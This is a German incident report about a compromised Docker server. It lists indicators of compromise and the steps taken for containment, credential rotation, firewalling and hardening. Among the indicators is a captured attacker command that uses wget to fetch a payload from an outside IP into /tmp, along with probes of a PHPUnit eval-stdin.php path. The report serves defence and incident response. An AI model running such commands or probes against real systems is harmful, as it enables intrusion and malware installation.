# KRITISCHER SICHERHEITSVORFALL

## Datum: 2026-01-23

## Status: 🔴 KRITISCH - Server wurde kompromittiert

## Gefundene Indikatoren

### 1. Verdächtige Prozesse im Container
```
PID 190: wget http://45.76.155.14/vim -O /tmp/vim
PID 193: {vim} ps -ef
PID 198: {exe} /sbin/audispd
```

### 2. Base64-kodiertes Malware-Script
In den App-Logs wurde ein base64-kodiertes Bash-Script gefunden, das versucht wurde auszuführen.

### 3. Nginx Logs zeigen Angriffsversuche
- Viele Requests zu `/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
- PROPFIND Requests (WebDAV Exploits)
- Von verschiedenen IPs: 173.249.11.249, 165.22.20.52, etc.

## Sofortmaßnahmen

### 1. Container isolieren und stoppen
```bash
cd /opt/historian-app/production
docker-compose -f docker-compose.production.yml stop app
```

### 2. Container neu bauen (ohne Cache)
```bash
docker-compose -f docker-compose.production.yml build --no-cache app
docker-compose -f docker-compose.production.yml up -d
```

### 3. System prüfen
```bash
# Prüfe alle Container
docker ps -a

# Prüfe verdächtige Netzwerk-Verbindungen
netstat -tuln | grep -v "127.0.0.1"

# Prüfe SSH Logs
grep "Failed password" /var/log/auth.log | tail -20
```

### 4. Passwörter ändern
- Database Passwörter
- Redis Passwörter
- Alle API Keys rotieren
- SSH Keys prüfen

### 5. Firewall prüfen
```bash
# Prüfe aktuelle Firewall Regeln
ufw status verbose

# Erlaube nur notwendige Ports
ufw allow 22/tcp   # SSH
ufw allow 80/tcp   # HTTP
ufw allow 443/tcp  # HTTPS
ufw deny all
```

## Langfristige Maßnahmen

1. **Container Security Hardening**
   - Non-root User verwenden (bereits implementiert: nextjs user)
   - Read-only filesystem wo möglich
   - Resource limits setzen
   - Security scanning

2. **Monitoring**
   - Fail2ban für SSH
   - Log-Monitoring für verdächtige Aktivitäten
   - Container Health Checks

3. **Backup & Recovery**
   - Regelmäßige Backups
   - Disaster Recovery Plan

4. **Code Review**
   - Prüfe ob Schwachstelle im Code war
   - Dependency Scanning

## Nächste Schritte

1. ✅ Container stoppen
2. ✅ Container neu bauen
3. ⏳ System komplett scannen
4. ⏳ Passwörter rotieren
5. ⏳ Firewall härten
6. ⏳ Monitoring einrichten
